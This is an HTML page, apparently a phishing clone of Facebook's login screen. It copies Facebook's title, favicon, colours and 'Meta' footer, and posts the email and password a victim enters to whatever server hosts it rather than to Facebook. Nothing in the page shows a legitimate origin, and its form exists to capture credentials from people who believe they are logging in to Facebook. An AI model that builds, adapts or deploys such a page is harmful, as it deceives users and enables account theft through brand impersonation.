<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – log in or sign up</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" />
  <style>
    @import url('https://fonts.googleapis.com/css?family=Helvetica:400,500,700&display=swap');

    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background-color: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }
    a {
      text-decoration: none;
      color: #1877f2;
      cursor: pointer;
    }
    .container {
      max-width: 980px;
      margin: 0 auto;
      padding: 40px 24px 24px 24px;
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
      min-height: 100vh;
      align-items: center;
    }
    .left {
      max-width: 440px;
      margin-top: 0;
      padding-right: 40px;
      flex: 1 1 440px;
    }
    .facebook-title {
      font-size: 60px;
      font-weight: 700;
      color: #1877f2; /* Facebook Blue */
      margin: 0 0 20px 0;
      line-height: 70px;
      user-select: none;
    }
    .subtitle {
      font-size: 24px;
      font-weight: 400;
      color: #1c1e21;
      line-height: 32px;
      user-select: none;
    }
    .login-box {
      background: #fff;
      padding: 24px 24px 12px 24px;
      border-radius: 8px;
      box-shadow: 0 8px 24px rgb(0 0 0 / 0.12);
      width: 320px;
      flex: 0 0 320px;
      margin-top: 0;
    }
    .login-box form {
      display: flex;
      flex-direction: column;
    }
    input[type="text"],
    input[type="password"] {
      height: 44px;
      margin-bottom: 12px;
      padding: 12px 16px;
      font-size: 17px;
      border-radius: 6px;
      border: 1px solid #dddfe2;
      outline: none;
      background-color: #f5f6f7;
      transition: background-color 0.2s ease;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      background-color: #fff;
      border-color: #1877f2;
      box-shadow: 0 0 2px #1877f2;
    }
    button {
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: 600;
      font-size: 20px;
      height: 44px;
      cursor: pointer;
      margin-top: 8px;
      margin-bottom: 14px;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #165ecc;
    }
    .forgot-link {
      color: #1877f2;
      font-size: 14px;
      text-align: center;
      margin-bottom: 16px;
      display: block;
    }
    hr {
      border: none;
      border-top: 1px solid #dadde1;
      margin: 12px 0 20px 0;
    }
    .create-account-btn {
      width: 100%;
      background-color: #42b72a;
      font-size: 17px;
      font-weight: 600;
      padding: 12px 0;
      border-radius: 6px;
      color: white;
      border: none;
      cursor: pointer;
      box-shadow: 0 2px 4px rgb(0 0 0 / 0.2);
      transition: background-color 0.3s ease;
    }
    .create-account-btn:hover {
      background-color: #36a420;
    }
    .footer {
      text-align: center;
      color: #65676b;
      font-size: 12px;
      margin: 40px 0 20px 0;
      user-select: none;
    }
    @media (max-width: 768px) {
      .container {
        flex-direction: column;
        padding: 40px 12px 20px 12px;
        min-height: auto;
      }
      .left {
        max-width: 100%;
        padding-right: 0;
        margin-bottom: 40px;
        text-align: center;
      }
      .facebook-title {
        font-size: 48px;
        line-height: 56px;
      }
      .subtitle {
        font-size: 20px;
        line-height: 28px;
      }
      .login-box {
        width: 100%;
        max-width: 400px;
        margin: 0 auto;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h1 class="facebook-title">Facebook</h1>
      <p class="subtitle">Connect with friends and the world around you on Facebook.</p>
    </div>
    <div class="login-box">
      <form method="post">
        <input type="text" name="email" placeholder="Email address or phone number" required />
        <input type="password" name="passw" placeholder="Password" required />
        <button type="submit">Log In</button>
        <a href="#" class="forgot-link">Forgotten password?</a>
        <hr />
        <button type="button" class="create-account-btn">Create New Account</button>
      </form>
    </div>
  </div>
  <div class="footer">Meta © 2025</div>
</body>
</html>
